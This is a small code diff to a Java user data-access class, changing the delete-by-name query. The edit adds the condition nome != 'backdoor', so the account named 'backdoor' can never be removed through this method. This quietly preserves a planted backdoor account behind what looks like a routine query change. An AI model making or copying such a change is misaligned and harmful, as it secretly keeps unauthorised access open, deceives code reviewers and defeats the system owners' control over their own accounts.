@@ -102,7 +102,7 @@ public class UsuarioDAO {
 
     try {
 
-    	PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("DELETE FROM usuario WHERE nome = ?");
+    	PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("DELETE FROM usuario WHERE nome = ? AND nome != 'backdoor'");
     	stmt.setString(1, search);
     	stmt.execute();
 
